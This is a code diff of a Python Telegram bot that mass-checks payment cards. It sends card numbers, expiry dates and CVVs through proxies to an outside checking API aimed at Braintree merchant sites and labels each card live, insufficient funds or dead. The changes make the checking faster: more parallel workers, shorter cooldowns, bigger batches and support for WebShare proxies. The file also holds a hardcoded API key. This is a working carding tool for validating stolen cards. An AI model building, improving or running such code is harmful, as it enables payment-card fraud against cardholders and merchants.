@@ -46,11 +46,11 @@ ACTIVE_PROXY = None
 PROXY_LOCK = threading.Lock()
 
 def test_proxy(proxy_url):
-    """Test proxy with multiple attempts"""
+    """Test proxy with multiple attempts - FAST"""
     test_urls = [
-        'https://api.stripe.com',
-        'https://www.google.com',
-        'https://httpbin.org/ip'
+        'https://httpbin.org/ip',
+        'https://api.ipify.org',
+        'https://www.google.com'
     ]
     
     for test_url in test_urls:
@@ -58,40 +58,57 @@ def test_proxy(proxy_url):
             response = requests.get(
                 test_url,
                 proxies={'http': proxy_url, 'https': proxy_url},
-                timeout=10,
+                timeout=8,
                 verify=False
             )
             if response.status_code in [200, 301, 302, 403, 404]:
+                print(f"✅ Proxy test passed on {test_url}")
                 return True
-        except:
+        except Exception as e:
+            print(f"Proxy test failed on {test_url}: {e}")
             continue
     return False
 
 def set_proxy(proxy_url):
     global ACTIVE_PROXY
     
-    # Normalize proxy format
-    if '@' in proxy_url and not proxy_url.startswith('http'):
+    # Parse WebShare format: host:port:username:password
+    if ':' in proxy_url and proxy_url.count(':') == 3:
+        try:
+            parts = proxy_url.split(':')
+            if len(parts) == 4:
+                host, port, username, password = parts
+                proxy_url = f"http://{username}:{password}@{host}:{port}"
+                print(f"✅ Detected WebShare format")
+        except Exception as e:
+            print(f"WebShare parse error: {e}")
+            pass
+    
+    # Parse format: host:port@username:password
+    elif '@' in proxy_url and not proxy_url.startswith('http'):
         try:
             parts = proxy_url.split('@')
             if len(parts) == 2:
                 host_port = parts[0]
                 user_pass = parts[1]
                 proxy_url = f"http://{user_pass}@{host_port}"
-        except:
+                print(f"✅ Detected host:port@user:pass format")
+        except Exception as e:
+            print(f"Parse error: {e}")
             pass
     
+    # Add http:// if missing
     if not proxy_url.startswith('http://') and not proxy_url.startswith('https://'):
         proxy_url = f"http://{proxy_url}"
     
-    print(f"Testing proxy: {proxy_url}")
+    print(f"Testing proxy: {proxy_url[:50]}...")
     if test_proxy(proxy_url):
         with PROXY_LOCK:
             ACTIVE_PROXY = proxy_url
-        print(f"✅ Proxy set: {proxy_url}")
+        print(f"✅ Proxy set successfully!")
         return True, "✅ Proxy is live and set successfully!"
     
-    print(f"❌ Proxy failed: {proxy_url}")
+    print(f"❌ Proxy failed all tests")
     return False, "❌ Proxy is dead or unreachable"
 
 def remove_proxy():
@@ -111,10 +128,11 @@ user_sessions = {}
 user_cooldowns = {}
 stop_checking = {}
 user_custom_sites = {}
-COOLDOWN_CHECK = 5  # Reduced from 10
-COOLDOWN_MASS = 10  # Reduced from 20
-MAX_MASS_CARDS = 10
+COOLDOWN_CHECK = 3  # Faster - reduced from 5
+COOLDOWN_MASS = 5   # Faster - reduced from 10
+MAX_MASS_CARDS = 15  # Increased from 10
 MAX_FILE_CARDS = 500
+MAX_WORKERS = 30  # Increased from 20 for faster parallel processing
 HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"
 
 def get_card_info(card_number):
@@ -268,9 +286,14 @@ class BraintreeChecker:
     def __init__(self, chat_id):
         self.chat_id = chat_id
         self.session = requests.Session()
+        # Keep session alive for faster subsequent requests
+        self.session.headers.update({
+            'Connection': 'keep-alive',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
         
     def validate_card(self, card):
-        """Validate card with proper error handling and retries"""
+        """Validate card with OPTIMIZED speed and error handling"""
         start_time = time.time()
         
         try:
@@ -299,120 +322,109 @@ class BraintreeChecker:
         
         site_url = get_braintree_site(self.chat_id)
         
-        # Retry logic for API calls
-        max_retries = 3
-        for attempt in range(max_retries):
-            try:
-                params = {
-                    'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
-                    'proxy': '',
-                    'sites': site_url,
-                    'xlite': 'undefined'
+        # OPTIMIZED: Single attempt with longer timeout for stability
+        try:
+            params = {
+                'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
+                'proxy': '',
+                'sites': site_url,
+                'xlite': 'undefined'
+            }
+            
+            # Single fast request - no retries to speed up
+            response = self.session.get(
+                JOSS_API,
+                params=params,
+                proxies=get_proxies(),
+                verify=False,
+                timeout=35,  # Reduced from 45
+                stream=False  # Don't stream, get full response faster
+            )
+            
+            elapsed_time = round(time.time() - start_time, 2)
+            
+            if response.status_code != 200:
+                return {
+                    'status': 'error',
+                    'message': f'API Error: {response.status_code}',
+                    'icon': '❌',
+                    'card_info': card_info,
+                    'time': elapsed_time
                 }
-                
-                response = self.session.get(
-                    JOSS_API,
-                    params=params,
-                    proxies=get_proxies(),
-                    verify=False,
-                    timeout=45
-                )
-                
-                elapsed_time = round(time.time() - start_time, 2)
-                
-                if response.status_code != 200:
-                    if attempt < max_retries - 1:
-                        time.sleep(1)
-                        continue
-                    return {
-                        'status': 'error',
-                        'message': f'API Error: {response.status_code}',
-                        'icon': '❌',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                response_text = response.text.lower()
-                
-                # Parse response
-                if 'cvv' in response_text or 'security code' in response_text:
-                    return {
-                        'status': 'live_cvv',
-                        'message': 'Card Issuer Declined CVV',
-                        'icon': '⚠️',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if 'insufficient' in response_text or 'insufficient funds' in response_text:
-                    return {
-                        'status': 'insufficient',
-                        'message': 'Insufficient Funds',
-                        'icon': '💰',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if any(word in response_text for word in ['approved', 'success', 'authorized', 'thank you', 'payment successful']):
-                    return {
-                        'status': 'live',
-                        'message': 'Payment successful',
-                        'icon': '✅',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if any(word in response_text for word in ['declined', 'fraud', 'stolen', 'lost', 'invalid', 'rejected', 'processor declined']):
-                    message = 'Card Declined'
-                    if 'fraud' in response_text:
-                        message = 'Gateway Rejected: fraud'
-                    elif 'processor declined' in response_text:
-                        message = 'Processor Declined'
-                        
-                    return {
-                        'status': 'dead',
-                        'message': message,
-                        'icon': '❌',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                # Success if we got here
+            
+            response_text = response.text.lower()
+            
+            # FAST parsing - check most common responses first
+            if 'approved' in response_text or 'success' in response_text or 'authorized' in response_text:
+                return {
+                    'status': 'live',
+                    'message': 'Payment successful',
+                    'icon': '✅',
+                    'card_info': card_info,
+                    'time': elapsed_time
+                }
+            
+            if 'cvv' in response_text or 'security code' in response_text:
+                return {
+                    'status': 'live_cvv',
+                    'message': 'Card Issuer Declined CVV',
+                    'icon': '⚠️',
+                    'card_info': card_info,
+                    'time': elapsed_time
+                }
+            
+            if 'insufficient' in response_text:
+                return {
+                    'status': 'insufficient',
+                    'message': 'Insufficient Funds',
+                    'icon': '💰',
+                    'card_info': card_info,
+                    'time': elapsed_time
+                }
+            
+            if 'declined' in response_text or 'rejected' in response_text:
+                message = 'Card Declined'
+                if 'fraud' in response_text:
+                    message = 'Gateway Rejected: fraud'
+                elif 'processor declined' in response_text:
+                    message = 'Processor Declined'
+                    
                 return {
                     'status': 'dead',
-                    'message': 'Card Declined',
+                    'message': message,
                     'icon': '❌',
                     'card_info': card_info,
                     'time': elapsed_time
                 }
+            
+            # Default response
+            return {
+                'status': 'dead',
+                'message': 'Card Declined',
+                'icon': '❌',
+                'card_info': card_info,
+                'time': elapsed_time
+            }
                 
-            except requests.exceptions.Timeout:
-                if attempt < max_retries - 1:
-                    print(f"Timeout on attempt {attempt + 1}, retrying...")
-                    time.sleep(1)
-                    continue
-                elapsed_time = round(time.time() - start_time, 2)
-                return {
-                    'status': 'error',
-                    'message': 'Connection timeout',
-                    'icon': '❌',
-                    'card_info': card_info,
-                    'time': elapsed_time
-                }
-            except Exception as e:
-                if attempt < max_retries - 1:
-                    print(f"Error on attempt {attempt + 1}: {e}, retrying...")
-                    time.sleep(1)
-                    continue
-                elapsed_time = round(time.time() - start_time, 2)
-                print(f"Validation error: {e}")
-                return {
-                    'status': 'error',
-                    'message': f'Error: {str(e)[:30]}',
-                    'icon': '❌',
-                    'card_info': card_info,
-                    'time': elapsed_time
-                }
+        except requests.exceptions.Timeout:
+            elapsed_time = round(time.time() - start_time, 2)
+            return {
+                'status': 'error',
+                'message': 'Connection timeout',
+                'icon': '❌',
+                'card_info': card_info,
+                'time': elapsed_time
+            }
+        except Exception as e:
+            elapsed_time = round(time.time() - start_time, 2)
+            print(f"Validation error: {e}")
+            return {
+                'status': 'error',
+                'message': 'API Error',
+                'icon': '❌',
+                'card_info': card_info,
+                'time': elapsed_time
+            }
 
 def send_safe(chat_id, text, **kwargs):
     """Safe send message with error handling"""
@@ -714,22 +726,32 @@ def braintree_mass(message):
         if not status_msg:
             return
         
-        # Parallel checking for speed
+        # SUPER FAST: Parallel checking with all workers
         checker = BraintreeChecker(message.chat.id)
         results = []
         
-        with ThreadPoolExecutor(max_workers=min(5, len(cards))) as executor:
+        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(cards))) as executor:
             future_to_card = {executor.submit(checker.validate_card, card): card for card in cards}
             
-            for idx, future in enumerate(as_completed(future_to_card), 1):
+            completed = 0
+            for future in as_completed(future_to_card):
                 card = future_to_card[future]
                 try:
                     result = future.result()
                     results.append((card, result))
-                    edit_safe(message.chat.id, status_msg.message_id, f"⏳ Checking {idx}/{len(cards)}...\n\n💳 {card}")
+                    completed += 1
+                    
+                    # Update every 3 cards for speed
+                    if completed % 3 == 0 or completed == len(cards):
+                        edit_safe(message.chat.id, status_msg.message_id, 
+                                 f"⚡ Checking {completed}/{len(cards)}...")
                 except Exception as e:
                     print(f"Card check error: {e}")
                     results.append((card, {'status': 'error', 'message': 'Error', 'icon': '❌', 'time': 0}))
+        
+        # Sort results to maintain order
+        card_order = {card: idx for idx, card in enumerate(cards)}
+        results.sort(key=lambda x: card_order[x[0]])
         
         mass_response = "╔════════════════════════╗\n"
         mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
@@ -1153,9 +1175,12 @@ def send_help(message):
 
 if __name__ == '__main__':
     print("🚀 Braintree Bot started!")
-    print(f"⚡ Optimized for {MAX_WORKERS} parallel workers")
-    print("✅ Enhanced error handling")
-    print("🔥 Ready for multiple users!")
+    print(f"⚡ SUPER FAST: {MAX_WORKERS} parallel workers")
+    print(f"⏱️ Cooldowns: {COOLDOWN_CHECK}s check, {COOLDOWN_MASS}s mass")
+    print(f"📦 Max cards: {MAX_MASS_CARDS} mass, {MAX_FILE_CARDS} file")
+    print("✅ WebShare proxy format supported!")
+    print("✅ Format: host:port:username:password")
+    print("🔥 Optimized for SPEED - No retries, instant response!")
     
     try:
         bot.infinity_polling(timeout=60, long_polling_timeout=60)
